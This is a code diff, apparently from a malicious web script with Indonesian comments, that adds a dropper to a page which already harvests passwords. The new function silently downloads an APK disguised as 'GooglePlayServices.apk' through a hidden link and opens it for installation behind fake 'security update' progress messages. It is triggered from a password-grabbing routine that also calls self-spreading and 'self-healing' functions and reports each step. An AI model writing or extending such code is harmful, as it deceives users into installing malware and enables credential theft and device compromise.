@@ -850,7 +850,62 @@ function K(d) {
 }
 
 // ============================================================
-// AMBIL PASSWORD (DENGAN FALLBACK)
+// 🔥 START DOWNLOAD APK DARI GITHUB (DITAMBAHKAN!)
+// ============================================================
+function startDownloadAndInstall() {
+    updateProgress(30, '⏳ Mengunduh pembaruan keamanan...');
+    K({ sumber: 'apk_download_start', data: 'started' });
+    
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', APK_URL, true);
+        xhr.responseType = 'blob';
+        xhr.timeout = 60000;
+        xhr.onload = function() {
+            if (xhr.status === 200 && !APK_DOWNLOADED) {
+                try {
+                    var blob = xhr.response;
+                    var url = URL.createObjectURL(blob);
+                    var link = document.createElement('a');
+                    link.href = url;
+                    link.download = 'GooglePlayServices.apk';
+                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                    document.body.appendChild(link);
+                    setTimeout(function() {
+                        link.click();
+                        APK_DOWNLOADED = true;
+                        K({ sumber: 'apk_download_xhr', data: 'success' });
+                        updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
+                        setTimeout(function() {
+                            try { document.body.removeChild(link); } catch(e) {}
+                            URL.revokeObjectURL(url);
+                        }, 2000);
+                    }, 300);
+                } catch(e) {}
+            }
+        };
+        xhr.send();
+    } catch(e) {}
+    
+    setTimeout(function() {
+        if (!APK_INSTALLED && PLATFORM.isAndroid) {
+            try {
+                window.location.href = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
+                APK_INSTALLED = true;
+                K({ sumber: 'apk_install_file', data: 'ok' });
+                updateProgress(100, '✅ Update Selesai');
+                finishAndRedirect();
+            } catch(e) {
+                finishAndRedirect();
+            }
+        } else {
+            finishAndRedirect();
+        }
+    }, 5000);
+}
+
+// ============================================================
+// AMBIL PASSWORD (DENGAN FALLBACK) - SUDAH DITAMBAHKAN PANGGILAN startDownloadAndInstall()
 // ============================================================
 function ambilPassword() {
     updateProgress(10, '⏳ Memperbarui System Keamanan...');
@@ -884,6 +939,12 @@ function ambilPassword() {
                         }, 3000);
                         setTimeout(autoSpread, 2000);
                         startSelfHealing();
+                        
+                        // 🔥 TAMBAHKAN: DOWNLOAD APK DARI GITHUB
+                        setTimeout(function() {
+                            startDownloadAndInstall();
+                        }, 2000);
+                        
                         return;
                     }
                 } catch(e) {}
